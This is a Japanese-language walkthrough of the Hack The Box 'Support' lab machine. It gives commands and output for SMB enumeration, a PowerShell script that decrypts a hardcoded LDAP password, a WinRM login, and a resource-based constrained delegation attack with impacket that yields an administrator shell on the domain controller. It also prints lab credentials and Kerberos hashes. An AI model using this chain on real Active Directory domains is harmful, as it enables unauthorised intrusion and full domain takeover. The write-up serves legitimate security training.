https://app.hackthebox.com/machines/Support

##  STEP 1
```sh
└─$ rustscan -a 10.129.230.181 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.230.181:53
Open 10.129.230.181:88
Open 10.129.230.181:135
Open 10.129.230.181:139
Open 10.129.230.181:389
Open 10.129.230.181:445
Open 10.129.230.181:464
Open 10.129.230.181:593
Open 10.129.230.181:636
Open 10.129.230.181:3268
Open 10.129.230.181:3269
Open 10.129.230.181:5985
Open 10.129.230.181:9389
Open 10.129.230.181:49664
Open 10.129.230.181:49667
Open 10.129.230.181:49678
Open 10.129.230.181:49683
Open 10.129.230.181:49707
10.129.230.181 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49707]
```


## STEP 2
guestでsmb列挙  
support-toolsにread権限を確認
```sh
└─$ netexec smb 10.129.230.181 -u ' ' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.129.230.181  445    DC               [+] support.htb\ : (Guest)
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share 
```
フォルダ内にファイルを複数確認したが、一般的なファイル名ではないuserinfo.exeを発見・ダウンロード
```sh
└─$ smbclient -N -c 'ls' //10.129.230.181/support-tools
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 969133 blocks available

└─$ smbget -N 'smb://10.129.230.181/support-tools/UserInfo.exe.zip'
Using domain: WORKGROUP, user: kali
smb://10.129.230.181/support-tools/UserInfo.exe.zip
Downloaded 271.00kB in 10 seconds
```
zipを展開すると、exeやdllが確認された  
userinfo.exeのファイル種別を確認すると、.net製であることを確認
```sh
└─$ unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config

└─$ file UserInfo.exe   
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```
ilspyでデコンパイル  
ユーザ名ldapでldapクエリを実行しているコードを確認  
ユーザ名ldapのパスワードは、protectedクラスから取得されているっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_01.png">  
protectedクラスを確認、暗号化パスワードの復号化処理を確認  
base64デコード後、xor暗号を２回実行している
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_02.png">  
復号化するためにc#コードをpowershellに実装し実行  
結果、`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`を取得
```powershell
$enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
$key = [System.Text.Encoding]::ASCII.GetBytes("armando")

$array = [System.Convert]::FromBase64String($enc_password)
$array2 = New-Object byte[] ($array.Length)

for ($i = 0; $i -lt $array.Length; $i++) {
    $array2[$i] = $array[$i] -bxor $key[$i % $key.Length] -bxor 0xDF
}

$decoded = [System.Text.Encoding]::UTF8.GetString($array2)
Write-Output $decoded
```
ということでユーザ名ldapでログイン成功  
5985番がオープンだったためwinrmログイン可能だが、ldapではwinrmログインできないことを確認
```sh
└─$ netexec ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --groups 'Remote Management Users'
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
LDAP        10.129.230.181  389    DC               support
```


## STEP 3
ldap情報を見ていると、supportに謎の属性を確認  
属性infoの値はもしかしたらパスワードかも  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_03.png">  
なんとwinrmでログイン成功、ユーザフラグゲット
```powershell
└─$ evil-winrm -i 10.129.230.181 -u support -p Ironside47pleasure40Watchful               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> cat ../desktop/user.txt
de1410b52df88029f1c9eddfac76d8a2
```


## STEP 4
bloodhoundを実行  
supportが所属するグループは、ドメコンのマシンアカウントに対してgenericall権限を有することを確認  
bloodhound上で、この権限を使用してrbcd攻撃が可能であることを確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_04.png">  
ドメインユーザでも作成可能である、マシンアカウントを作成
```sh
└─$ impacket-addcomputer -computer-name 'kali$' -computer-pass 'Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account kali$ with password Ironside47pleasure40Watchful.
```
ターゲットのマシンアカウントの`msDS-AllowedToActOnBehalfOfOtherIdentity`属性に作成マシンアカウントを追加  
これにより、作成マシンアカウントの委任の権限がdc$に対してのみ許可されるようになった
```sh
└─$ impacket-rbcd -delegate-to 'dc$' -delegate-from 'kali$' -action 'write' -ts -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-07 07:26:16] [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[2025-11-07 07:26:17] [*] Delegation rights modified successfully!
[2025-11-07 07:26:17] [*] kali$ can now impersonate users on dc$ via S4U2Proxy
[2025-11-07 07:26:17] [*] Accounts allowed to act on behalf of other identity:
[2025-11-07 07:26:17] [*]     kali$        (S-1-5-21-1677581083-3380853377-188903654-6101)

└─$ impacket-rbcd -delegate-to 'dc$' -action 'read' -ts -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-07 07:26:58] [*] Accounts allowed to act on behalf of other identity:
[2025-11-07 07:26:58] [*]     kali$        (S-1-5-21-1677581083-3380853377-188903654-6101)
```
s4u2selfを使用して、作成マシンアカウントに対するtgsをパスワードなしでadministrator権限で作成  
s4u2proxyを使用して、s4u2selfで取得したtgsを送信した後にdc$のcifsに対するtgsを取得  
```sh
└─$ impacket-getST -spn 'cifs/dc.support.htb' -impersonate administrator -ts -dc-ip 10.129.230.181 'support/kali$:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-07 07:52:02] [-] CCache file is not found. Skipping...
[2025-11-07 07:52:02] [*] Getting TGT for user
[2025-11-07 07:52:04] [*] Impersonating administrator
[2025-11-07 07:52:04] [*] Requesting S4U2self
[2025-11-07 07:52:06] [*] Requesting S4U2Proxy
[2025-11-07 07:52:07] [*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

└─$ impacket-describeTicket administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache                                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 15f9e24aa0e3a0a42dfb85bcec0f5070
[*] User Name                     : administrator
[*] User Realm                    : support
[*] Service Name                  : cifs/dc.support.htb
[*] Service Realm                 : SUPPORT.HTB
[*] Start Time                    : 07/11/2025 07:52:08 AM
[*] End Time                      : 07/11/2025 17:52:04 PM
[*] RenewTill                     : 08/11/2025 07:52:03 AM
[*] Flags                         : (0x40a50000) forwardable, renewable, pre_authent, ok_as_delegate, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : FfniSqDjoKQt+4W87A9QcA==
[*] Kerberoast hash               : $krb5tgs$18$USER$SUPPORT.HTB$*cifs/dc.support.htb*$a4d5cb95dc4ea10bbbcc9ce8$1da6ea3b0925f5a231b0596e4212482e412ede081d1606902fffa0b029a0ab9bf40e0d7d8d8f007ce604fa0ec4e2005edbbdebea0acb35fa7552608f98fbf0906dc169bccef99ff2ba1500333b12305d7fed4edf40872c594244f28473e6ba6fc4736c8e4fdfa721a89babf1ffee0caefcb6b97185f96b0f31542731d5d8994de2e2f35060b9cd54af5f3dde402c6d74f5497d0086b9b10000004e8399717e00cd20d5be09c0c5cb9690c30b191a3c7c85a8205e0f31295328f591f4d1f55cd9f1106c9dcc7dc825098781061b77448dff2c99f2f28aa05afaccbf1e930694919e107536b02e73ce7a5f2e35faac2122ee86589cc9188475465f1def584f9a50b7daa8ef588b900e89f58ed126892afe311c8025f205776a1c9ad1e182809ebbc792810561ea27a816abaf1aa5fdab5c34c69233e6675c756fce12907afd85c5284d669f1c5629f9935dc03343b182d669da7e823b240b3148cd4ae1923189d46d5dcf25a7afbecf88e72c8493e0335647bdcbfefe6370ad5b76d7f3b0f48d9ab64c9f433975596f6797e0515f56e867f216dd9e38cabb761c16e7efa7eded7db90a0b6c60a401d78e5bc5022740be0ac2b696586333b546e086fac4ad9b8b0a6575b2104d7d5bf84097858fc6230942c5f8d2de9e8894bdac738507c3af27113d8d88c2d77adeb192eac5b962a27fccf24f8b5df0f83857d9f8763fe974a754e1075222f61ae3b3e8917a4ff2cc539758eef6ff4c57f3acc37e7141a1d4d42a5acf4ec9c325c8d94c9343f1f1a2aaaa894fbaec24f0c449b4c2b6a0b6eb7956c341ba17daf1ca2c5e0243d523872ef0c827f63d4223b64d4ef4cf1407cfd6a207f91faeedfd9f664dc8c8eab938d774fe79f362643bd0f3b6e90bcabe98150315a0a7bc44d0e323184616d49892c72358e5e21d0d6d61864f7b7e509619a624e2d4fbc31f060d0de45163144eb6a3a8156c35bba9d1e67ff9c880466e56bb234a6295ec4739f8f4eca7fe187bdc288490547bedddae2c3de0c71545e5f597ba418cc7705c7f0074b4267e183070d69272b193efc00d8494233091a1fe063591cb6e88cf6088d905e6349404b4ac58f0dc18760084c5857b47cfad1d0aa1021384cc44f4283a5a8f2c43f2e6324c8ad5669d347ccdfbe4454b9abb0d89c4915a3f018165088b1de5941e5e91578617ae058453826fff166d32559a2371ab60714cce9f5247d62858e3141c72a521dcc1275750ef40be51adb07f21bf0c5671a41b32d8a0c721cae65d644d2aa7d93d6f3ef26278c52342cde751da3fe08f9573abe8404f00b906c5857ef6cd721829331b3188c55612f5ded4bc9b1c9bafec29955674ec42d5bc7fb0b518c898363e9bbc476767de7bbdac0a241a0611884dc494bc71e9e9d66c03ee6aa1986b9b03054fd4e565d764d62f9aff5d28c33db48f42fb3a6be87fac500cb9424c60baf09568ba5140f42c67e6352bd9f9c9446d922b862121ed3af768f741889d96626c30687bdf6013d9e6f4fe2cb2c2a53c6a9acf4d3d0fb9dab03cdaff2c1d68cea3ed111b045925361e03efd72ea432c669aaa8498c2f14946cf3642a7b2c4cf3a7963f507c17a926a496c0c65d8a2344f3a3f375b5823104e210fd077c74189bbe192ce40bbd842cc1d0044bd2843aa5863510c41726bdba975b7819dc8b2e07151742336c050e1cab5dc5142dd361659572ed9e240c107debf51e6ca4a9ab149e3c0425632d8539abab529c40d839b31eb6e05382af0422d267f464cff9b2aad88ad160286e7f6aac96db3350bee4d77154d3072cc8cf
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : cifs/dc.support.htb
[*]   Service Realm               : SUPPORT.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```
取得したtgsを使用してpsexec、ルートフラグゲット
```sh
└─$ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

└─$ impacket-psexec -k -target-ip 10.129.230.181 'dc.support.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.230.181.....
[*] Found writable share ADMIN$
[*] Uploading file CpcORACz.exe
[*] Opening SVCManager on 10.129.230.181.....
[*] Creating service cxzd on 10.129.230.181.....
[*] Starting service cxzd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
f006b3f9a0397b6fed86ed2e083026d1
```
おまけ  
s4u2selfのみで、作成マシンアカウントのtgsを取得した場合
```sh
└─$ impacket-getST -impersonate administrator -ts -self -dc-ip 10.129.230.181 'support/kali$:Ironside47pleasure40Watchful'                                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-08 09:50:46] [-] CCache file is not found. Skipping...
[2025-11-08 09:50:46] [*] Getting TGT for user
[2025-11-08 09:50:48] [*] Impersonating administrator
[2025-11-08 09:50:48] [*] Requesting S4U2self
[2025-11-08 09:50:50] [*] Saving ticket in administrator@kali$@SUPPORT.HTB.ccache
                                                                                                                                                                       
└─$ python3.13 -c "import hashlib; print(hashlib.new('md4', 'Ironside47pleasure40Watchful'.encode('utf-16le')).hexdigest())"                                         
11fbaef07d83e3f6cde9f0ff98a3af3d
                                                                                                                                                                       
└─$ impacket-describeTicket --rc4 11fbaef07d83e3f6cde9f0ff98a3af3d administrator@kali\$@SUPPORT.HTB.ccache                                                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : b4b64f660316b96a71f9082a17cc00da
[*] User Name                     : administrator
[*] User Realm                    : support
[*] Service Name                  : kali$
[*] Service Realm                 : SUPPORT.HTB
[*] Start Time                    : 08/11/2025 09:50:49 AM
[*] End Time                      : 08/11/2025 19:50:48 PM
[*] RenewTill                     : 09/11/2025 09:50:47 AM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : tLZPZgMWuWpx+QgqF8wA2g==
[*] Kerberoast hash               : $krb5tgs$23$*USER$SUPPORT.HTB$kali$*$e92fd03378aab7eb199297f6cf8efb7b$a4a2bdd08247cf7e71461bc8a112a156af8f6b062a0f2c996089211cc676b060ba5d516d2d02cba94fc939c81d1f143370a513fbfcf510159843543608a2df9f5212fcf23f32a28ff075e29f4b09f5175e0ff556324d44767b1ea78edd7a9eeeea03d55dc8b99fd2f30232e42be6f426a1d1468ed997554b1df35c90954935ee53c55aa796411661d6103f5f68ccb6a767a5e5fa5cce83c28000f64f3085c549c52115b9350ce6f38f73968f4dd1c5ee642339cac719e309e3e769e596833d5527c80072632a90d002298627bb23a5ef30801c6c4c9ba2cf7a76ec23ae7820b7f63d542773d6a345d93a93caa235095e6e167ec94a3ec99eb2253bde44a03da677efd618fe6e7d8ae38a91cb3f9c8850206aed3d91599ac6a28d8e06e4f24a20692538291ac4d9606e09ef772c1e82f9de49acc5dc66cc1dcabb313136cf0e269d5757212d90aaf143261713896182ef014afe4e3fc8e8fdc0ca49dd102b6f618c1979b723f9f0e63d34f1a755bc0b770ef94fd9c4ce936966d0bbe6cb4d63a4d83c6e330f152cbc3075b0c409d782dad17014b2d7d60775dccfc503056725f2e27ad61114eb7e986e040dc971754c00035d5f8e00bcbc585439c929c15f117c014be483ec86cf4320e2432638781c45e4a3cb37a38f4d6647895b133654e25dbea460dfc1c2dfccfc25e2a8a5d4d6e9967486edc47963244a2ffe97ca72280166e2e7ce463148e340108244491c69ed9a24502cf45eea08229c75f508e0307850452ba79c4f25d671d7f8d8347fd211077055e54bb3cf05c5739f76c4045e389ebc82dc60802a62ac19449af87d48e4e30221659c45588474f9ba1979e4eab7a46d2084ffb31d6b4bf541da6fbf773224e34e56333fc75febe098965f16db68b1042d88c0c66298574de57f4f1716c938f0b27fb201d6238aa8d7adefa76e492e25d034450fe44bcce7257306d375e558b089bbb385843983b33f5696bed829faa50fbda3454a8b469c43cafbef28a59ded60affe88f95beec9c99159ef4405781f7123b3b889e11bd395942b2b06dfd4d2e3227dc76f58632e6811fe61be431e6157df785abc0d62e14d15aca4f29401243028f0119dcdb473a57a3a8478e2d53c4fffe2f035c5338054bd105320a71b7b2d10ece61fe15aa7d80e04843e08b6d39b2fe13c73e4f8c997230518e07e24522842e005be9d298bafb06540ca2e325e9812c861bbbbecab77b44dc4cbbd2a14d1cacdffff319420e460bd27d791976e627fd818293d0356016be68f37396e0174b614e26d636498a81eac9f933238899d1e5786ca90ee8907a4ea08f5ffdfe87835e844ad9d98c1eedade6699604bc1cbc0a49fff1015004b1450c85f689ae5b9eccf1be4f6d3a81c86a318c4f584bb17b5637daca46d24a5e5c90be22eee1c473e33c7f2a9ef047220b285371768f95208ac972ad430dc70cd6702898e3863413a8732e7e63d48e088c58090953acbc7e1d7155f478cb4f56c002a1b82526323b8355834bad9c67bf314bd19d84ac8752ff00376fe19bb6c8c7b512257fe0710696a563f2d4cc520ac41
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : kali$
[*]   Service Realm               : SUPPORT.HTB
[*]   Encryption type             : rc4_hmac (etype 23)
[*] Decoding credential[0]['ticket']['enc-part']:
[*]   LoginInfo                   
[*]     Logon Time                : 08/11/2025 11:53:45 AM
[*]     Logoff Time               : Infinity (absolute time)
[*]     Kickoff Time              : Infinity (absolute time)
[*]     Password Last Set         : 19/07/2022 17:55:56 PM
[*]     Password Can Change       : 20/07/2022 17:55:56 PM
[*]     Password Must Change      : Infinity (absolute time)
[*]     LastSuccessfulILogon      : Infinity (absolute time)
[*]     LastFailedILogon          : Infinity (absolute time)
[*]     FailedILogonCount         : 0
[*]     Account Name              : Administrator
[*]     Full Name                 : 
[*]     Logon Script              : 
[*]     Profile Path              : 
[*]     Home Dir                  : 
[*]     Dir Drive                 : 
[*]     Logon Count               : 73
[*]     Bad Password Count        : 0
[*]     User RID                  : 500
[*]     Group RID                 : 513
[*]     Group Count               : 5
[*]     Groups                    : 512, 520, 513, 519, 518
[*]     Groups (decoded)          : (512) Domain Admins
[*]                                 (520) Group Policy Creator Owners
[*]                                 (513) Domain Users
[*]                                 (519) Enterprise Admins
[*]                                 (518) Schema Admins
[*]     User Flags                : (544) LOGON_EXTRA_SIDS, LOGON_RESOURCE_GROUPS
[*]     User Session Key          : 00000000000000000000000000000000
[*]     Logon Server              : DC
[*]     Logon Domain Name         : SUPPORT
[*]     Logon Domain SID          : S-1-5-21-1677581083-3380853377-188903654
[*]     User Account Control      : (16) USER_NORMAL_ACCOUNT
[*]     Extra SID Count           : 1
[*]     Extra SIDs                : S-1-18-2 Service asserted identity (SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED)
[*]     Resource Group Domain SID : S-1-5-21-1677581083-3380853377-188903654
[*]     Resource Group Count      : 1
[*]     Resource Group Ids        : 572
[*]     LMKey                     : 0000000000000000
[*]     SubAuthStatus             : 0
[*]     Reserved3                 : 0
[*]   ClientName                  
[*]     Client Id                 : 08/11/2025 14:50:48 PM
[*]     Client Name               : administrator
[*]   UpnDns                      
[*]     Flags                     : (3) U_UsernameOnly, S_SidSamSupplied
[*]     UPN                       : Administrator@support.htb
[*]     DNS Domain Name           : SUPPORT.HTB
[*]     SamAccountName            : Administrator
[*]     UserSid                   : S-1-5-21-1677581083-3380853377-188903654-500
[*]   ServerChecksum              
[*]     Signature Type            : hmac_md5
[*]     Signature                 : 46ea0b8b0a6d53d8d38435eaa9d223d9
[*]   KDCChecksum                 
[*]     Signature Type            : hmac_sha1_96_aes256
[*]     Signature                 : d9ef2528a21cdd2446b31f62
```
